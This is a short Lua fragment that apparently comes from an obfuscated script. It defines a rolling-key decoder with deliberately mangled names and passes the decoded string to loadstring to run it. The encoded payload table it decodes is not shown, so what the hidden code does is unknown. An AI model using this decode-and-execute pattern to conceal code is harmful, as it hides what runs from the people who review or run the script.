    local function VM_001I1I(d, k, m)
        local R_O00OOOl = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_O00OOOl, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_O00OOOl)
    end

    -- Execution Guard
    local F_lO01O00 = loadstring(VM_001I1I(B_I1Ol, 71, 5))
    if F_lO01O00 then
        F_lO01O00(...)
    end
